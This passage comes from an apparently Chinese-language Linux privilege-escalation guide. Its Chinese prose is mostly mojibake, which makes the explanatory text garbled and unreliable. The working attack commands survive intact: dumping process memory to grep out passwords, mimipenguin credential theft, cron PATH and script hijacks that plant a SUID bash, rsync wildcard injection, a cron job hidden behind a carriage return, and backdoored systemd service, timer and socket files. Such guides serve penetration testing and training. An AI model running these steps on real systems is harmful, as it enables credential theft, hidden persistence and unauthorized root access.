[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
</code></pre>
<h3 id="å·¥å…·"><a class="header" href="#å·¥å…·">å·¥å…·</a></h3>
<p>è¦è½¬å‚¨è¿›ç¨‹å†…å­˜ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š</p>
<ul>
<li><a href="https://github.com/Sysinternals/ProcDump-for-Linux"><strong>https://github.com/Sysinternals/ProcDump-for-Linux</strong></a></li>
<li><a href="https://github.com/hajzer/bash-memory-dump"><strong>https://github.com/hajzer/bash-memory-dump</strong></a> (root) - _æ‚¨å¯ä»¥æ‰‹åŠ¨åˆ é™¤rootè¦æ±‚å¹¶è½¬å‚¨ç”±æ‚¨æ‹¥æœ‰çš„è¿›ç¨‹</li>
<li>æ¥è‡ª <a href="https://www.delaat.net/rp/2016-2017/p97/report.pdf"><strong>https://www.delaat.net/rp/2016-2017/p97/report.pdf</strong></a> çš„è„šæœ¬ A.5 (éœ€è¦root)</li>
</ul>
<h3 id="ä»è¿›ç¨‹å†…å­˜ä¸­è·å–å‡­æ®"><a class="header" href="#ä»è¿›ç¨‹å†…å­˜ä¸­è·å–å‡­æ®">ä»è¿›ç¨‹å†…å­˜ä¸­è·å–å‡­æ®</a></h3>
<h4 id="æ‰‹åŠ¨ç¤ºä¾‹"><a class="header" href="#æ‰‹åŠ¨ç¤ºä¾‹">æ‰‹åŠ¨ç¤ºä¾‹</a></h4>
<p>å¦‚æœæ‚¨å‘ç°èº«ä»½éªŒè¯è¿›ç¨‹æ­£åœ¨è¿è¡Œï¼š</p>
<pre><code class="language-bash">ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
</code></pre>
<p>æ‚¨å¯ä»¥è½¬å‚¨è¿›ç¨‹ï¼ˆè¯·å‚é˜…ä¹‹å‰çš„éƒ¨åˆ†ä»¥æ‰¾åˆ°è½¬å‚¨è¿›ç¨‹å†…å­˜çš„ä¸åŒæ–¹æ³•ï¼‰ï¼Œå¹¶åœ¨å†…å­˜ä¸­æœç´¢å‡­æ®ï¼š</p>
<pre><code class="language-bash">./dump-memory.sh 2027
strings *.dump | grep -i password
</code></pre>
<h4 id="mimipenguin"><a class="header" href="#mimipenguin">mimipenguin</a></h4>
<p>è¯¥å·¥å…· <a href="https://github.com/huntergregal/mimipenguin"><strong>https://github.com/huntergregal/mimipenguin</strong></a> å°† <strong>ä»å†…å­˜ä¸­çªƒå–æ˜æ–‡å‡­æ®</strong> å’Œä¸€äº› <strong>ä¼—æ‰€å‘¨çŸ¥çš„æ–‡ä»¶</strong>ã€‚å®ƒéœ€è¦ root æƒé™æ‰èƒ½æ­£å¸¸å·¥ä½œã€‚</p>
<div class="table-wrapper"><table><thead><tr><th>ç‰¹æ€§</th><th>è¿›ç¨‹åç§°</th></tr></thead><tbody>
<tr><td>GDM å¯†ç ï¼ˆKali æ¡Œé¢ï¼ŒDebian æ¡Œé¢ï¼‰</td><td>gdm-password</td></tr>
<tr><td>Gnome å¯†é’¥ç¯ï¼ˆUbuntu æ¡Œé¢ï¼ŒArchLinux æ¡Œé¢ï¼‰</td><td>gnome-keyring-daemon</td></tr>
<tr><td>LightDMï¼ˆUbuntu æ¡Œé¢ï¼‰</td><td>lightdm</td></tr>
<tr><td>VSFTPdï¼ˆæ´»åŠ¨ FTP è¿æ¥ï¼‰</td><td>vsftpd</td></tr>
<tr><td>Apache2ï¼ˆæ´»åŠ¨ HTTP åŸºæœ¬è®¤è¯ä¼šè¯ï¼‰</td><td>apache2</td></tr>
<tr><td>OpenSSHï¼ˆæ´»åŠ¨ SSH ä¼šè¯ - Sudo ä½¿ç”¨ï¼‰</td><td>sshd:</td></tr>
</tbody></table>
</div>
<h4 id="search-regexestruffleproc"><a class="header" href="#search-regexestruffleproc">Search Regexes/<a href="https://github.com/controlplaneio/truffleproc">truffleproc</a></a></h4>
<pre><code class="language-bash"># un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
</code></pre>
<h2 id="scheduledcron-jobs"><a class="header" href="#scheduledcron-jobs">Scheduled/Cron jobs</a></h2>
<p>æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•è®¡åˆ’ä»»åŠ¡å­˜åœ¨æ¼æ´ã€‚ä¹Ÿè®¸ä½ å¯ä»¥åˆ©ç”¨ç”± root æ‰§è¡Œçš„è„šæœ¬ï¼ˆé€šé…ç¬¦æ¼æ´ï¼Ÿå¯ä»¥ä¿®æ”¹ root ä½¿ç”¨çš„æ–‡ä»¶ï¼Ÿä½¿ç”¨ç¬¦å·é“¾æ¥ï¼Ÿåœ¨ root ä½¿ç”¨çš„ç›®å½•ä¸­åˆ›å»ºç‰¹å®šæ–‡ä»¶ï¼Ÿï¼‰ã€‚</p>
<pre><code class="language-bash">crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v "^#"
</code></pre>
<h3 id="cron-path"><a class="header" href="#cron-path">Cron path</a></h3>
<p>ä¾‹å¦‚ï¼Œåœ¨ <em>/etc/crontab</em> ä¸­å¯ä»¥æ‰¾åˆ° PATH: <em>PATH=<strong>/home/user</strong>:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</em></p>
<p>(<em>æ³¨æ„ç”¨æˆ· "user" å¯¹ /home/user å…·æœ‰å†™æƒé™</em>)</p>
<p>å¦‚æœåœ¨è¿™ä¸ª crontab ä¸­ï¼Œroot ç”¨æˆ·å°è¯•æ‰§è¡ŒæŸä¸ªå‘½ä»¤æˆ–è„šæœ¬è€Œä¸è®¾ç½®è·¯å¾„ã€‚ä¾‹å¦‚: <em>* * * * root overwrite.sh</em><br />
ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å¾— root shell:</p>
<pre><code class="language-bash">echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
</code></pre>
<h3 id="cron-ä½¿ç”¨å¸¦é€šé…ç¬¦çš„è„šæœ¬é€šé…ç¬¦æ³¨å…¥"><a class="header" href="#cron-ä½¿ç”¨å¸¦é€šé…ç¬¦çš„è„šæœ¬é€šé…ç¬¦æ³¨å…¥">Cron ä½¿ç”¨å¸¦é€šé…ç¬¦çš„è„šæœ¬ï¼ˆé€šé…ç¬¦æ³¨å…¥ï¼‰</a></h3>
<p>å¦‚æœç”± root æ‰§è¡Œçš„è„šæœ¬åœ¨å‘½ä»¤ä¸­åŒ…å«â€œ<strong>*</strong>â€ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥åˆ¶é€ æ„æƒ³ä¸åˆ°çš„äº‹æƒ…ï¼ˆå¦‚æƒé™æå‡ï¼‰ã€‚ç¤ºä¾‹ï¼š</p>
<pre><code class="language-bash">rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
</code></pre>
<p><strong>å¦‚æœé€šé…ç¬¦å‰é¢æœ‰ä¸€ä¸ªè·¯å¾„ï¼Œæ¯”å¦‚</strong> <em><strong>/some/path/*</strong></em> <strong>ï¼Œé‚£ä¹ˆå®ƒå°±ä¸å®¹æ˜“å—åˆ°æ”»å‡»ï¼ˆå³ä½¿æ˜¯</strong> <em><strong>./*</strong></em> <strong>ä¹Ÿä¸è¡Œï¼‰ã€‚</strong></p>
<p>é˜…è¯»ä»¥ä¸‹é¡µé¢ä»¥è·å–æ›´å¤šé€šé…ç¬¦åˆ©ç”¨æŠ€å·§ï¼š</p>
<p>{% content-ref url="wildcards-spare-tricks.md" %}
<a href="wildcards-spare-tricks.html">wildcards-spare-tricks.md</a>
{% endcontent-ref %}</p>
<h3 id="cron-è„šæœ¬è¦†ç›–å’Œç¬¦å·é“¾æ¥"><a class="header" href="#cron-è„šæœ¬è¦†ç›–å’Œç¬¦å·é“¾æ¥">Cron è„šæœ¬è¦†ç›–å’Œç¬¦å·é“¾æ¥</a></h3>
<p>å¦‚æœä½  <strong>å¯ä»¥ä¿®æ”¹ä¸€ä¸ªç”± root æ‰§è¡Œçš„ cron è„šæœ¬</strong>ï¼Œä½ å¯ä»¥å¾ˆå®¹æ˜“åœ°è·å¾—ä¸€ä¸ª shellï¼š</p>
<pre><code class="language-bash">echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; &lt;/PATH/CRON/SCRIPT&gt;
#Wait until it is executed
/tmp/bash -p
</code></pre>
<p>å¦‚æœç”± root æ‰§è¡Œçš„è„šæœ¬ä½¿ç”¨ä¸€ä¸ª <strong>æ‚¨æ‹¥æœ‰å®Œå…¨è®¿é—®æƒé™çš„ç›®å½•</strong>ï¼Œé‚£ä¹ˆåˆ é™¤è¯¥æ–‡ä»¶å¤¹å¹¶ <strong>åˆ›å»ºä¸€ä¸ªæŒ‡å‘å¦ä¸€ä¸ªæ–‡ä»¶å¤¹çš„ç¬¦å·é“¾æ¥</strong>ï¼Œè¯¥æ–‡ä»¶å¤¹æä¾›ç”±æ‚¨æ§åˆ¶çš„è„šæœ¬ï¼Œå¯èƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚</p>
<pre><code class="language-bash">ln -d -s &lt;/PATH/TO/POINT&gt; &lt;/PATH/CREATE/FOLDER&gt;
</code></pre>
<h3 id="frequent-cron-jobs"><a class="header" href="#frequent-cron-jobs">Frequent cron jobs</a></h3>
<p>æ‚¨å¯ä»¥ç›‘æ§è¿›ç¨‹ï¼Œä»¥æœç´¢æ¯ 1ã€2 æˆ– 5 åˆ†é’Ÿæ‰§è¡Œçš„è¿›ç¨‹ã€‚ä¹Ÿè®¸æ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æå‡æƒé™ã€‚</p>
<p>ä¾‹å¦‚ï¼Œè¦<strong>æ¯ 0.1 ç§’ç›‘æ§ 1 åˆ†é’Ÿ</strong>ï¼Œ<strong>æŒ‰æ‰§è¡Œæ¬¡æ•°è¾ƒå°‘çš„å‘½ä»¤æ’åº</strong>å¹¶åˆ é™¤æ‰§è¡Œæ¬¡æ•°æœ€å¤šçš„å‘½ä»¤ï¼Œæ‚¨å¯ä»¥è¿™æ ·åšï¼š</p>
<pre><code class="language-bash">for i in $(seq 1 610); do ps -e --format cmd &gt;&gt; /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
</code></pre>
<p><strong>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨</strong> <a href="https://github.com/DominicBreuker/pspy/releases"><strong>pspy</strong></a> ï¼ˆè¿™å°†ç›‘è§†å¹¶åˆ—å‡ºæ¯ä¸ªå¯åŠ¨çš„è¿›ç¨‹ï¼‰ã€‚</p>
<h3 id="éšå½¢çš„-cron-ä½œä¸š"><a class="header" href="#éšå½¢çš„-cron-ä½œä¸š">éšå½¢çš„ cron ä½œä¸š</a></h3>
<p>å¯ä»¥åˆ›å»ºä¸€ä¸ª cron ä½œä¸š <strong>åœ¨æ³¨é‡Šåæ·»åŠ å›è½¦ç¬¦</strong>ï¼ˆæ²¡æœ‰æ¢è¡Œç¬¦ï¼‰ï¼Œå¹¶ä¸” cron ä½œä¸šå°†æ­£å¸¸å·¥ä½œã€‚ç¤ºä¾‹ï¼ˆæ³¨æ„å›è½¦ç¬¦ï¼‰ï¼š</p>
<pre><code class="language-bash">#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
</code></pre>
<h2 id="æœåŠ¡"><a class="header" href="#æœåŠ¡">æœåŠ¡</a></h2>
<h3 id="å¯å†™çš„-service-æ–‡ä»¶"><a class="header" href="#å¯å†™çš„-service-æ–‡ä»¶">å¯å†™çš„ <em>.service</em> æ–‡ä»¶</a></h3>
<p>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥å†™ä»»ä½• <code>.service</code> æ–‡ä»¶ï¼Œå¦‚æœå¯ä»¥ï¼Œæ‚¨ <strong>å¯ä»¥ä¿®æ”¹å®ƒ</strong> ä»¥ä¾¿åœ¨æœåŠ¡ <strong>å¯åŠ¨</strong>ã€<strong>é‡å¯</strong>æˆ– <strong>åœæ­¢</strong> æ—¶ <strong>æ‰§è¡Œ</strong> æ‚¨çš„ <strong>åé—¨</strong>ï¼ˆä¹Ÿè®¸æ‚¨éœ€è¦ç­‰åˆ°æœºå™¨é‡å¯ï¼‰ã€‚<br />
ä¾‹å¦‚ï¼Œåœ¨ .service æ–‡ä»¶ä¸­åˆ›å»ºæ‚¨çš„åé—¨ï¼Œä½¿ç”¨ <strong><code>ExecStart=/tmp/script.sh</code></strong></p>
<h3 id="å¯å†™çš„æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶"><a class="header" href="#å¯å†™çš„æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶">å¯å†™çš„æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶</a></h3>
<p>è¯·è®°ä½ï¼Œå¦‚æœæ‚¨å¯¹æœåŠ¡æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶å…·æœ‰ <strong>å†™æƒé™</strong>ï¼Œæ‚¨å¯ä»¥å°†å®ƒä»¬æ›´æ”¹ä¸ºåé—¨ï¼Œè¿™æ ·å½“æœåŠ¡é‡æ–°æ‰§è¡Œæ—¶ï¼Œåé—¨å°†è¢«æ‰§è¡Œã€‚</p>
<h3 id="systemd-path---ç›¸å¯¹è·¯å¾„"><a class="header" href="#systemd-path---ç›¸å¯¹è·¯å¾„">systemd PATH - ç›¸å¯¹è·¯å¾„</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ <strong>systemd</strong> ä½¿ç”¨çš„ PATHï¼š</p>
<pre><code class="language-bash">systemctl show-environment
</code></pre>
<p>å¦‚æœæ‚¨å‘ç°æ‚¨å¯ä»¥åœ¨è·¯å¾„çš„ä»»ä½•æ–‡ä»¶å¤¹ä¸­<strong>å†™å…¥</strong>ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿ<strong>æå‡æƒé™</strong>ã€‚æ‚¨éœ€è¦æœç´¢<strong>åœ¨æœåŠ¡é…ç½®</strong>æ–‡ä»¶ä¸­ä½¿ç”¨çš„<strong>ç›¸å¯¹è·¯å¾„</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-bash">ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
</code></pre>
<p>ç„¶åï¼Œåœ¨æ‚¨å¯ä»¥å†™å…¥çš„ systemd PATH æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ª <strong>å¯æ‰§è¡Œæ–‡ä»¶</strong>ï¼Œå…¶ <strong>åç§°ä¸ç›¸å¯¹è·¯å¾„äºŒè¿›åˆ¶æ–‡ä»¶ç›¸åŒ</strong>ï¼Œå½“æœåŠ¡è¢«è¦æ±‚æ‰§è¡Œè„†å¼±æ“ä½œï¼ˆ<strong>å¯åŠ¨</strong>ï¼Œ<strong>åœæ­¢</strong>ï¼Œ<strong>é‡æ–°åŠ è½½</strong>ï¼‰æ—¶ï¼Œæ‚¨çš„ <strong>åé—¨å°†è¢«æ‰§è¡Œ</strong>ï¼ˆæ™®é€šç”¨æˆ·é€šå¸¸æ— æ³•å¯åŠ¨/åœæ­¢æœåŠ¡ï¼Œä½†è¯·æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ä½¿ç”¨ <code>sudo -l</code>ï¼‰ã€‚</p>
<p><strong>é€šè¿‡ <code>man systemd.service</code> äº†è§£æ›´å¤šå…³äºæœåŠ¡çš„ä¿¡æ¯ã€‚</strong></p>
<h2 id="å®šæ—¶å™¨"><a class="header" href="#å®šæ—¶å™¨"><strong>å®šæ—¶å™¨</strong></a></h2>
<p><strong>å®šæ—¶å™¨</strong> æ˜¯ä»¥ <code>**.timer**</code> ç»“å°¾çš„ systemd å•å…ƒæ–‡ä»¶ï¼Œç”¨äºæ§åˆ¶ <code>**.service**</code> æ–‡ä»¶æˆ–äº‹ä»¶ã€‚ <strong>å®šæ—¶å™¨</strong> å¯ä»¥ä½œä¸º cron çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå› ä¸ºå®ƒä»¬å†…ç½®æ”¯æŒæ—¥å†æ—¶é—´äº‹ä»¶å’Œå•è°ƒæ—¶é—´äº‹ä»¶ï¼Œå¹¶ä¸”å¯ä»¥å¼‚æ­¥è¿è¡Œã€‚</p>
<p>æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºæ‰€æœ‰å®šæ—¶å™¨ï¼š</p>
<pre><code class="language-bash">systemctl list-timers --all
</code></pre>
<h3 id="å¯å†™å®šæ—¶å™¨"><a class="header" href="#å¯å†™å®šæ—¶å™¨">å¯å†™å®šæ—¶å™¨</a></h3>
<p>å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹å®šæ—¶å™¨ï¼Œåˆ™å¯ä»¥ä½¿å…¶æ‰§è¡ŒæŸäº› systemd.unit çš„å®ä¾‹ï¼ˆå¦‚ <code>.service</code> æˆ– <code>.target</code>ï¼‰</p>
<pre><code class="language-bash">Unit=backdoor.service
</code></pre>
<p>åœ¨æ–‡æ¡£ä¸­ï¼Œæ‚¨å¯ä»¥é˜…è¯»å•ä½çš„å®šä¹‰ï¼š</p>
<blockquote>
<p>å½“æ­¤è®¡æ—¶å™¨åˆ°æœŸæ—¶è¦æ¿€æ´»çš„å•ä½ã€‚å‚æ•°æ˜¯å•ä½åç§°ï¼Œå…¶åç¼€ä¸æ˜¯â€œ.timerâ€ã€‚å¦‚æœæœªæŒ‡å®šï¼Œåˆ™æ­¤å€¼é»˜è®¤ä¸ºä¸è®¡æ—¶å™¨å•ä½åŒåçš„æœåŠ¡ï¼Œåç¼€é™¤å¤–ã€‚ï¼ˆè§ä¸Šæ–‡ã€‚ï¼‰å»ºè®®æ¿€æ´»çš„å•ä½åç§°å’Œè®¡æ—¶å™¨å•ä½çš„å•ä½åç§°åœ¨åç¼€ä¹‹å¤–å‘½åç›¸åŒã€‚</p>
</blockquote>
<p>å› æ­¤ï¼Œè¦æ»¥ç”¨æ­¤æƒé™ï¼Œæ‚¨éœ€è¦ï¼š</p>
<ul>
<li>æ‰¾åˆ°æŸä¸ª systemd å•å…ƒï¼ˆå¦‚ <code>.service</code>ï¼‰ï¼Œè¯¥å•å…ƒæ­£åœ¨ <strong>æ‰§è¡Œä¸€ä¸ªå¯å†™çš„äºŒè¿›åˆ¶æ–‡ä»¶</strong></li>
<li>æ‰¾åˆ°æŸä¸ª systemd å•å…ƒï¼Œè¯¥å•å…ƒæ­£åœ¨ <strong>æ‰§è¡Œä¸€ä¸ªç›¸å¯¹è·¯å¾„</strong>ï¼Œå¹¶ä¸”æ‚¨å¯¹ <strong>systemd PATH</strong> å…·æœ‰ <strong>å¯å†™æƒé™</strong>ï¼ˆä»¥å†’å……è¯¥å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</li>
</ul>
<p><strong>é€šè¿‡ <code>man systemd.timer</code> äº†è§£æ›´å¤šå…³äºè®¡æ—¶å™¨çš„ä¿¡æ¯ã€‚</strong></p>
<h3 id="å¯ç”¨è®¡æ—¶å™¨"><a class="header" href="#å¯ç”¨è®¡æ—¶å™¨"><strong>å¯ç”¨è®¡æ—¶å™¨</strong></a></h3>
<p>è¦å¯ç”¨è®¡æ—¶å™¨ï¼Œæ‚¨éœ€è¦ root æƒé™å¹¶æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer â†’ /lib/systemd/system/backu2.timer.
</code></pre>
<p>æ³¨æ„ <strong>timer</strong> æ˜¯é€šè¿‡åœ¨ <code>/etc/systemd/system/&lt;WantedBy_section&gt;.wants/&lt;name&gt;.timer</code> ä¸Šåˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥æ¥ <strong>æ¿€æ´»</strong> çš„ã€‚</p>
<h2 id="sockets"><a class="header" href="#sockets">Sockets</a></h2>
<p>Unix åŸŸå¥—æ¥å­— (UDS) ä½¿å¾—åœ¨å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹ä¸­åŒä¸€å°æˆ–ä¸åŒæœºå™¨ä¸Šçš„ <strong>è¿›ç¨‹é€šä¿¡</strong> æˆä¸ºå¯èƒ½ã€‚å®ƒä»¬åˆ©ç”¨æ ‡å‡†çš„ Unix æè¿°ç¬¦æ–‡ä»¶è¿›è¡Œè®¡ç®—æœºé—´é€šä¿¡ï¼Œå¹¶é€šè¿‡ <code>.socket</code> æ–‡ä»¶è¿›è¡Œè®¾ç½®ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ <code>.socket</code> æ–‡ä»¶é…ç½®å¥—æ¥å­—ã€‚</p>
<p><strong>é€šè¿‡ <code>man systemd.socket</code> äº†è§£æ›´å¤šå…³äºå¥—æ¥å­—çš„ä¿¡æ¯ã€‚</strong> åœ¨æ­¤æ–‡ä»¶ä¸­ï¼Œå¯ä»¥é…ç½®å‡ ä¸ªæœ‰è¶£çš„å‚æ•°ï¼š</p>
<ul>
<li><code>ListenStream</code>, <code>ListenDatagram</code>, <code>ListenSequentialPacket</code>, <code>ListenFIFO</code>, <code>ListenSpecial</code>, <code>ListenNetlink</code>, <code>ListenMessageQueue</code>, <code>ListenUSBFunction</code>: è¿™äº›é€‰é¡¹ä¸åŒï¼Œä½†æ€»ç»“èµ·æ¥æ˜¯ <strong>æŒ‡ç¤ºå°†è¦ç›‘å¬</strong> å¥—æ¥å­—çš„ä½ç½®ï¼ˆAF_UNIX å¥—æ¥å­—æ–‡ä»¶çš„è·¯å¾„ï¼Œç›‘å¬çš„ IPv4/6 å’Œ/æˆ–ç«¯å£å·ç­‰ï¼‰</li>
<li><code>Accept</code>: æ¥å—ä¸€ä¸ªå¸ƒå°”å‚æ•°ã€‚å¦‚æœ <strong>true</strong>ï¼Œåˆ™ <strong>ä¸ºæ¯ä¸ªä¼ å…¥è¿æ¥ç”Ÿæˆä¸€ä¸ªæœåŠ¡å®ä¾‹</strong>ï¼Œå¹¶ä¸”ä»…å°†è¿æ¥å¥—æ¥å­—ä¼ é€’ç»™å®ƒã€‚å¦‚æœ <strong>false</strong>ï¼Œåˆ™æ‰€æœ‰ç›‘å¬å¥—æ¥å­—æœ¬èº«éƒ½è¢« <strong>ä¼ é€’ç»™å¯åŠ¨çš„æœåŠ¡å•å…ƒ</strong>ï¼Œå¹¶ä¸”æ‰€æœ‰è¿æ¥ä»…ç”Ÿæˆä¸€ä¸ªæœåŠ¡å•å…ƒã€‚å¯¹äºæ•°æ®æŠ¥å¥—æ¥å­—å’Œ FIFOï¼Œæ­¤å€¼è¢«å¿½ç•¥ï¼Œå› ä¸ºå•ä¸ªæœåŠ¡å•å…ƒæ— æ¡ä»¶å¤„ç†æ‰€æœ‰ä¼ å…¥æµé‡ã€‚<strong>é»˜è®¤ä¸º false</strong>ã€‚å‡ºäºæ€§èƒ½åŸå› ï¼Œå»ºè®®ä»…ä»¥é€‚åˆ <code>Accept=no</code> çš„æ–¹å¼ç¼–å†™æ–°çš„å®ˆæŠ¤è¿›ç¨‹ã€‚</li>
<li><code>ExecStartPre</code>, <code>ExecStartPost</code>: æ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå‘½ä»¤è¡Œï¼Œè¿™äº›å‘½ä»¤åœ¨ç›‘å¬ <strong>å¥—æ¥å­—</strong>/FIFO è¢« <strong>åˆ›å»º</strong> å’Œç»‘å®šä¹‹å‰æˆ–ä¹‹å <strong>æ‰§è¡Œ</strong>ã€‚å‘½ä»¤è¡Œçš„ç¬¬ä¸€ä¸ªæ ‡è®°å¿…é¡»æ˜¯ç»å¯¹æ–‡ä»¶åï¼Œåé¢è·Ÿéšè¿›ç¨‹çš„å‚æ•°ã€‚</li>
<li><code>ExecStopPre</code>, <code>ExecStopPost</code>: åœ¨ç›‘å¬ <strong>å¥—æ¥å­—</strong>/FIFO è¢« <strong>å…³é—­</strong> å’Œç§»é™¤ä¹‹å‰æˆ–ä¹‹å <strong>æ‰§è¡Œ</strong> çš„é¢å¤– <strong>å‘½ä»¤</strong>ã€‚</li>
<li><code>Service</code>: æŒ‡å®š <strong>åœ¨ä¼ å…¥æµé‡ä¸Šæ¿€æ´»çš„</strong> <strong>æœåŠ¡</strong> å•å…ƒåç§°ã€‚æ­¤è®¾ç½®ä»…å…è®¸ç”¨äº Accept=no çš„å¥—æ¥å­—ã€‚é»˜è®¤ä¸ºä¸å¥—æ¥å­—åŒåçš„æœåŠ¡ï¼ˆåç¼€è¢«æ›¿æ¢ï¼‰ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸éœ€è¦ä½¿ç”¨æ­¤é€‰é¡¹ã€‚</li>
</ul>
<h3 id="å¯å†™çš„-socket-æ–‡ä»¶"><a class="header" href="#å¯å†™çš„-socket-æ–‡ä»¶">å¯å†™çš„ .socket æ–‡ä»¶</a></h3>
<p>å¦‚æœæ‚¨å‘ç°ä¸€ä¸ª <strong>å¯å†™</strong> çš„ <code>.socket</code> æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥åœ¨ <code>[Socket]</code> éƒ¨åˆ†çš„å¼€å¤´æ·»åŠ ç±»ä¼¼ <code>ExecStartPre=/home/kali/sys/backdoor</code> çš„å†…å®¹ï¼Œåé—¨å°†åœ¨å¥—æ¥å­—åˆ›å»ºä¹‹å‰æ‰§è¡Œã€‚å› æ­¤ï¼Œæ‚¨ <strong>å¯èƒ½éœ€è¦ç­‰åˆ°æœºå™¨é‡å¯ã€‚</strong><br />
&amp;#xNAN;<em>Næ³¨æ„ç³»ç»Ÿå¿…é¡»ä½¿ç”¨è¯¥å¥—æ¥å­—æ–‡ä»¶é…ç½®ï¼Œå¦åˆ™åé—¨å°†ä¸ä¼šè¢«æ‰§è¡Œ</em></p>
<h3 id="å¯å†™å¥—æ¥å­—"><a class="header" href="#å¯å†™å¥—æ¥å­—">å¯å†™å¥—æ¥å­—</a></h3>
<p>å¦‚æœæ‚¨ <strong>è¯†åˆ«åˆ°ä»»ä½•å¯å†™å¥—æ¥å­—</strong>ï¼ˆ<em>ç°åœ¨æˆ‘ä»¬è°ˆè®ºçš„æ˜¯ Unix å¥—æ¥å­—ï¼Œè€Œä¸æ˜¯é…ç½® <code>.socket</code> æ–‡ä»¶</em>ï¼‰ï¼Œé‚£ä¹ˆ <strong>æ‚¨å¯ä»¥ä¸è¯¥å¥—æ¥å­—è¿›è¡Œé€šä¿¡</strong>ï¼Œå¹¶å¯èƒ½åˆ©ç”¨ä¸€ä¸ªæ¼æ´ã€‚</p>
<h3 id="æšä¸¾-unix-å¥—æ¥å­—"><a class="header" href="#æšä¸¾-unix-å¥—æ¥å­—">æšä¸¾ Unix å¥—æ¥å­—</a></h3>
<pre><code class="language-bash">netstat -a -p --unix
</code></pre>
<h3 id="åŸå§‹è¿æ¥"><a class="header" href="#åŸå§‹è¿æ¥">åŸå§‹è¿æ¥</a></h3>
<pre><code class="language-bash">#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
</code></pre>
<p><strong>åˆ©ç”¨ç¤ºä¾‹ï¼š</strong></p>
<p>{% content-ref url="socket-command-injection.md" %}
<a href="socket-command-injection.html">socket-command-injection.md</a>
{% endcontent-ref %}</p>
<h3 id="http-å¥—æ¥å­—"><a class="header" href="#http-å¥—æ¥å­—">HTTP å¥—æ¥å­—</a></h3>
<p>è¯·æ³¨æ„ï¼Œå¯èƒ½æœ‰ä¸€äº› <strong>ç›‘å¬ HTTP</strong> è¯·æ±‚çš„ <strong>å¥—æ¥å­—</strong>ï¼ˆ<em>æˆ‘ä¸æ˜¯åœ¨è°ˆè®º .socket æ–‡ä»¶ï¼Œè€Œæ˜¯ä½œä¸º unix å¥—æ¥å­—çš„æ–‡ä»¶</em>ï¼‰ã€‚æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ£€æŸ¥ï¼š</p>
<pre><code class="language-bash">curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
</code></pre>
<p>å¦‚æœå¥—æ¥å­— <strong>ä»¥ HTTP</strong> è¯·æ±‚å“åº”ï¼Œåˆ™æ‚¨å¯ä»¥ <strong>ä¸å…¶é€šä¿¡</strong>ï¼Œå¹¶å¯èƒ½ <strong>åˆ©ç”¨æŸäº›æ¼æ´</strong>ã€‚</p>
<h3 id="å¯å†™çš„-docker-å¥—æ¥å­—"><a class="header" href="#å¯å†™çš„-docker-å¥—æ¥å­—">å¯å†™çš„ Docker å¥—æ¥å­—</a></h3>
